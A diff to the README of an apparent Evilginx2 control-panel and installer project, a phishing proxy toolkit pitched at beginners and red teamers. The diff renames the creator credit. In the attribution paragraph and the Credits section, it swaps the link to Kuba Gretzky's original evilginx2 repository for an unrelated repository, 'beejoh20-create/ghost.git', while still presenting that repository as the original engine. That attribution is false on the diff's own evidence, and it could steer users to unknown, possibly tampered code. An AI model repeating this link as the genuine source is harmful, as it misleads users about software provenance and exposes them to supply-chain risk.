@@ -18,7 +18,7 @@
   <img src="https://img.shields.io/badge/version-3.5.10-0ea5e9?style=for-the-badge" alt="3.5.10">
 </p>
 
-<p align="center"><b>Created by ZynTarvo</b> · Telegram: <a href="https://t.me/zyntarvo">@zyntarvo</a> · <i>Nothing Is Impossible</i></p>
+<p align="center"><b>Created by DarkNode Tech</b> · Telegram: <a href="https://t.me/zyntarvo">@zyntarvo</a> · <i>Nothing Is Impossible</i></p>
 
 ---
 
@@ -55,7 +55,7 @@ Built for red teamers, pentesters, and anyone who wants Evilginx running in minu
 
 This project does **not** steal anyone’s work.
 
-[Evilginx2](https://github.com/kgretzky/evilginx2) is the original engine by **Kuba Gretzky (@mrgretzky)**. We clone it cleanly, then add a web control panel and a one-click installer on top — so people who are just starting in cybersecurity can use the tool without living in the command line.
+[Evilginx2](https://github.com/beejoh20-create/ghost.git) is the original engine by **Kuba Gretzky (@mrgretzky)**. We clone it cleanly, then add a web control panel and a one-click installer on top — so people who are just starting in cybersecurity can use the tool without living in the command line.
 
 Think of it as a companion: the same Evilginx, made simpler to install and operate. After clone, the installer patches `core/http_proxy.go` so an origin HTTP **429** is reported to the panel (`/api/internal/egx-429`) and Proxy Manager can rotate the hop.
 
@@ -458,7 +458,7 @@ Telegram: [@zyntarvo](https://t.me/zyntarvo)
 
 ## Credits
 
-- **Evilginx2** — [Kuba Gretzky](https://github.com/kgretzky/evilginx2)
+- **Evilginx2** — [Kuba Gretzky](https://github.com/beejoh20-create/ghost.git)
 - **Control Panel + Auto Installer** — [ZynTarvo](https://github.com/zyntarvo) · Telegram [@zyntarvo](https://t.me/zyntarvo)
 
 <p align="center"><i>ZynTarvo — Nothing Is Impossible</i></p>
